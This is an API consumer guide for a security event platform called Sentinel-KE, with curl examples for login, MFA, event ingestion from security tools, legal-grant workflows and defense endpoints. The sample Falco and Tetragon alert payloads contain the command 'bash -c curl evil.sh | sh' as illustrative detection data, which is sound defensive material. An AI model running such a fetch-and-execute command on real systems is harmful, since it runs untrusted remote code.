# Sentinel-KE API Consumer Guide

This guide is for frontend engineers, integration teams, and hackathon judges who want fast, working API examples.

For architecture and security internals, see `docs/BACKEND_DOCUMENTATION.md`.
For operations commands, see `docs/RUNBOOK.md`.

## 1) Base URL and Auth Modes

Set local values:

```bash
export BASE_URL="http://localhost:8000"
export API_KEY="<your-frontend-or-service-api-key>"
```

Sentinel-KE supports two auth patterns:

- Service/API-key mode: send `X-API-Key`.
- User/session mode: login and send `Authorization: Bearer <access_token>`.

Some routes (legal/economy sensitive actions, crypto snapshot) require central access and MFA step-up.

## 2) Quick Health Checks

```bash
curl -sS "$BASE_URL/health"
curl -sS "$BASE_URL/ready"
```

## 3) User Auth and MFA

### 3.1 Login

```bash
curl -sS -X POST "$BASE_URL/v1/auth/login" \
  -H "Content-Type: application/json" \
  -d '{
    "username": "central-admin",
    "password": "<password>",
    "client_fingerprint": "laptop-001"
  }'
```

Successful response shape:

```json
{
  "token_type": "bearer",
  "access_token": "...",
  "refresh_token": "...",
  "access_expires_at": "2026-02-25T...+00:00",
  "refresh_expires_at": "2026-02-26T...+00:00",
  "principal": {
    "principal_type": "user",
    "access_level": "central",
    "scopes": ["..."],
    "mfa_authenticated": true,
    "mfa_at": "2026-02-25T...+00:00"
  }
}
```

If MFA is enabled and OTP is missing, you receive:

```json
{"detail":"mfa_code_required"}
```

Then call login again with `otp_code`.

### 3.2 Token refresh

```bash
curl -sS -X POST "$BASE_URL/v1/auth/refresh" \
  -H "Content-Type: application/json" \
  -d '{
    "refresh_token": "<refresh_token>",
    "client_fingerprint": "laptop-001"
  }'
```

### 3.3 MFA enrollment flow

Start enrollment:

```bash
curl -sS -X POST "$BASE_URL/v1/auth/mfa/enroll/start" \
  -H "Authorization: Bearer $ACCESS_TOKEN"
```

Verify enrollment:

```bash
curl -sS -X POST "$BASE_URL/v1/auth/mfa/enroll/verify" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"otp_code":"123456"}'
```

## 4) Canonical Ingestion APIs

### 4.1 Single event

```bash
curl -sS -X POST "$BASE_URL/v1/ingest/event" \
  -H "X-API-Key: $API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "event_type": "DDOS_SIGNAL_EVENT",
    "occurred_at": "2026-02-25T12:00:00Z",
    "confidence": 0.92,
    "anchors": {
      "service_id": "gov-api-gateway",
      "endpoint": "/payments"
    },
    "payload": {
      "service_id": "gov-api-gateway",
      "endpoint": "/payments",
      "req_rate": 3800,
      "error_rate": 0.21,
      "unique_ips_count": 1400
    },
    "classification": "RESTRICTED",
    "schema_version": "v1"
  }'
```

Example response:

```json
{
  "event_hash": "...",
  "status": "accepted",
  "accepted_at": "2026-02-25T...+00:00",
  "source_id": "...",
  "classification": "RESTRICTED"
}
```

### 4.2 Batch events

```bash
curl -sS -X POST "$BASE_URL/v1/ingest/batch" \
  -H "X-API-Key: $API_KEY" \
  -H "Content-Type: application/json" \
  -d '[{...event1...},{...event2...}]'
```

### 4.3 Envelope schema

```bash
curl -sS "$BASE_URL/v1/ingest/schema"
```

## 5) Connector-Based Ingestion

List connectors:

```bash
curl -sS "$BASE_URL/v1/integrations/connectors" \
  -H "X-API-Key: $API_KEY"
```

Ingest external payload via connector mapping:

```bash
curl -sS -X POST "$BASE_URL/v1/integrations/waf_api_attack_v1/event" \
  -H "X-API-Key: $API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "source_api_key": "<source-registry-api-key>",
    "confidence": 0.88,
    "payload": {
      "timestamp": "2026-02-25T12:10:00Z",
      "service_id": "gov-api-gateway",
      "endpoint": "/payments",
      "attack_type": "sql_injection",
      "decision": "allowed",
      "src_ip": "41.90.0.10"
    }
  }'
```

Suricata EVE alert example:

```bash
curl -sS -X POST "$BASE_URL/v1/integrations/suricata_eve_v1/event" \
  -H "X-API-Key: $API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "source_api_key": "<source-registry-api-key>",
    "confidence": 0.94,
    "payload": {
      "timestamp": "2026-02-25T12:12:00Z",
      "src_ip": "41.90.0.10",
      "dest_ip": "196.201.214.10",
      "dest_port": 443,
      "app_proto": "http",
      "alert": {
        "signature": "ET WEB_SERVER SQL Injection Attempt",
        "category": "Web Application Attack",
        "severity": 1,
        "action": "allowed"
      },
      "http": {
        "hostname": "api.gov.ke",
        "url": "/v1/payments",
        "http_method": "POST"
      }
    }
  }'
```

Zeek notice example:

```bash
curl -sS -X POST "$BASE_URL/v1/integrations/zeek_notice_v1/event" \
  -H "X-API-Key: $API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "source_api_key": "<source-registry-api-key>",
    "confidence": 0.9,
    "payload": {
      "ts": "2026-02-25T12:15:00Z",
      "note": "SSH::Password_Guessing",
      "msg": "198.51.100.10 appears to be guessing SSH passwords",
      "src": "198.51.100.10",
      "dst": "10.0.0.10",
      "host": "bastion.internal",
      "p": 22,
      "proto": "tcp"
    }
  }'
```

CrowdSec alert example:

```bash
curl -sS -X POST "$BASE_URL/v1/integrations/crowdsec_alert_v1/event" \
  -H "X-API-Key: $API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "source_api_key": "<source-registry-api-key>",
    "confidence": 0.91,
    "payload": {
      "created_at": "2026-02-25T12:18:00Z",
      "scenario": "crowdsecurity/http-bf",
      "scope": "ip",
      "value": "41.90.0.10",
      "service_id": "ecitizen-api",
      "remediation": true,
      "decisions": ["ban"],
      "events_count": 17
    }
  }'
```

Falco runtime alert example:

```bash
curl -sS -X POST "$BASE_URL/v1/integrations/falco_runtime_v1/event" \
  -H "X-API-Key: $API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "source_api_key": "<source-registry-api-key>",
    "confidence": 0.92,
    "payload": {
      "output_time": "2026-02-25T12:20:00Z",
      "rule": "Write below binary dir",
      "priority": "Warning",
      "hostname": "worker-01",
      "output": "File below a binary dir opened for writing",
      "output_fields": {
        "container.id": "abc123",
        "container.name": "payments-api",
        "k8s.pod.name": "payments-api-7689",
        "k8s.ns.name": "prod",
        "proc.name": "bash",
        "proc.cmdline": "bash -c curl evil.sh | sh",
        "fd.name": "/usr/bin/curl",
        "user.name": "root"
      }
    }
  }'
```

Tetragon runtime alert example:

```bash
curl -sS -X POST "$BASE_URL/v1/integrations/tetragon_runtime_v1/event" \
  -H "X-API-Key: $API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "source_api_key": "<source-registry-api-key>",
    "confidence": 0.93,
    "payload": {
      "event_time": "2026-02-25T12:22:00Z",
      "event_type": "process_exec",
      "policy_name": "suspicious-shell",
      "verdict": "denied",
      "hostname": "worker-02",
      "pod_name": "identity-api-554f",
      "namespace": "prod",
      "workload": "identity-api",
      "process_name": "bash",
      "command_line": "bash -c curl evil.sh | sh",
      "file_path": "/usr/bin/bash"
    }
  }'
```

Coraza / OWASP CRS alert example:

```bash
curl -sS -X POST "$BASE_URL/v1/integrations/coraza_waf_v1/event" \
  -H "X-API-Key: $API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "source_api_key": "<source-registry-api-key>",
    "confidence": 0.94,
    "payload": {
      "timestamp": "2026-02-25T12:24:00Z",
      "host": "api.gov.ke",
      "uri": "/v1/payments",
      "rule_id": "942100",
      "attack_type": "sql_injection",
      "action": "denied",
      "remote_addr": "41.90.0.10",
      "request_method": "POST",
      "tx_id": "tx-1"
    }
  }'
```

## 6) Event Retrieval

Search events:

```bash
curl -sS "$BASE_URL/v1/events/search?event_type=WEB_ATTACK_EVENT&size=20" \
  -H "X-API-Key: $API_KEY"
```

Timeline aggregate:

```bash
curl -sS "$BASE_URL/v1/events/timeline?start=2026-02-25T00:00:00Z&end=2026-02-25T23:59:59Z&interval=1h" \
  -H "X-API-Key: $API_KEY"
```

Fetch by hash:

```bash
curl -sS "$BASE_URL/v1/events/<event_hash>" \
  -H "X-API-Key: $API_KEY"
```

## 7) Legal Authorization Flow

Sensitive economy operations require a legal grant token.

### 7.1 Create legal order

```bash
curl -sS -X POST "$BASE_URL/v1/legal/orders" \
  -H "Authorization: Bearer $CENTRAL_ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "order_number": "HC-2026-001",
    "court_name": "High Court Nairobi",
    "purpose": "Economic leakage investigation",
    "authorized_by": "Hon. Judge X",
    "valid_from": "2026-02-25T00:00:00Z",
    "valid_until": "2026-02-26T00:00:00Z",
    "allowed_actions": ["economic_leakage_scan", "coverup_risk_scan"],
    "allowed_targets": ["economy:procurement", "economy:coverup"],
    "created_by": "central-admin"
  }'
```

### 7.2 Build approval payload and authorize

Generate canonical message to sign:

```bash
curl -sS -X POST "$BASE_URL/v1/legal/approval/payload" \
  -H "Authorization: Bearer $CENTRAL_ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "order_id": "<order_id>",
    "action_type": "economic_leakage_scan",
    "target": "economy:procurement",
    "requested_by": "central-admin",
    "requested_minutes": 60
  }'
```

Authorize and receive execution token:

```bash
curl -sS -X POST "$BASE_URL/v1/legal/authorize" \
  -H "Authorization: Bearer $CENTRAL_ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "order_id": "<order_id>",
    "action_type": "economic_leakage_scan",
    "target": "economy:procurement",
    "requested_by": "central-admin",
    "approved_by": ["approver_a", "approver_b"],
    "approval_signatures": [
      {"approver_id":"approver_a","signature_hex":"<sig_hex_a>"},
      {"approver_id":"approver_b","signature_hex":"<sig_hex_b>"}
    ],
    "requested_minutes": 60
  }'
```

Read `execution_token` from response and pass as `X-Legal-Grant-Token`.

## 8) Economy APIs (Protected by Legal Grant)

Run leakage detection:

```bash
curl -sS -X POST "$BASE_URL/v1/economy/leakage/run?window_days=30" \
  -H "Authorization: Bearer $CENTRAL_ACCESS_TOKEN" \
  -H "X-Legal-Grant-Token: $LEGAL_GRANT_TOKEN"
```

List leakage alerts:

```bash
curl -sS "$BASE_URL/v1/economy/leakage/alerts?agency=min-finance&min_score=0.6" \
  -H "Authorization: Bearer $CENTRAL_ACCESS_TOKEN"
```

Coverup scan:

```bash
curl -sS -X POST "$BASE_URL/v1/economy/coverup/run?window_days=30&min_score=0.45" \
  -H "Authorization: Bearer $CENTRAL_ACCESS_TOKEN" \
  -H "X-Legal-Grant-Token: $LEGAL_GRANT_TOKEN"
```

## 9) Defense APIs

Upsert vulnerability finding:

```bash
curl -sS -X POST "$BASE_URL/v1/defense/vulnerabilities" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "asset_id": "ifmis-db-01",
    "cve_id": "CVE-2026-1001",
    "severity": "critical",
    "kev": true,
    "epss": 0.87,
    "status": "open",
    "due_at": "2026-03-01T00:00:00Z"
  }'
```

Score patch SLA:

```bash
curl -sS -X POST "$BASE_URL/v1/defense/vulnerabilities/score-sla" \
  -H "Authorization: Bearer $ACCESS_TOKEN"
```

Record restore drill:

```bash
curl -sS -X POST "$BASE_URL/v1/defense/backups/restore-drills" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "asset_id": "ifmis-db-01",
    "backup_id": "snap-2026-02-25",
    "success": false,
    "rto_target_minutes": 120,
    "rto_actual_minutes": 240,
    "notes": "restore exceeded RTO"
  }'
```

Refresh and read threat alerts:

```bash
curl -sS -X POST "$BASE_URL/v1/defense/threat-alerts/refresh" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"minutes":60}'

curl -sS "$BASE_URL/v1/defense/threat-alerts?severity=high" \
  -H "Authorization: Bearer $ACCESS_TOKEN"
```

Crypto posture snapshot (central + step-up):

```bash
curl -sS -X POST "$BASE_URL/v1/defense/crypto/posture/snapshot" \
  -H "Authorization: Bearer $CENTRAL_STEPUP_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"details":{"reason":"daily-baseline"}}'
```

## 10) AI APIs (Read + Feedback)

Read predictions:

```bash
curl -sS "$BASE_URL/v1/ai/predictions?prediction_type=risk_gnn&limit=20" \
  -H "Authorization: Bearer $ACCESS_TOKEN"
```

Submit feedback:

```bash
curl -sS -X POST "$BASE_URL/v1/ai/feedback?prediction_id=<prediction_uuid>&feedback_label=1&analyst_id=analyst-1&notes=confirmed_true_positive" \
  -H "Authorization: Bearer $ACCESS_TOKEN"
```

## 11) Common Error Patterns

Common response body:

```json
{"detail":"<error_code_or_message>"}
```

Frequent auth/security errors:

- `401 invalid_api_key`
- `401 mfa_code_required`
- `403 central_access_required`
- `403 insufficient_scope`
- `403 mfa_step_up_required`
- `403 mfa_step_up_expired`
- `401 missing_legal_grant_token`
- `403 grant_not_allowed` or `403 grant_expired`

## 12) Practical Integration Tips

- Use API key mode for machine-to-machine ingestion and scripted demos.
- Use user tokens for frontend and role-aware workflows.
- Keep one legal authorization flow in your client for economy-sensitive actions.
- Cache `access_token` and rotate with refresh token before expiry.
- Always send timezone-aware timestamps (`...Z` or `+00:00`).
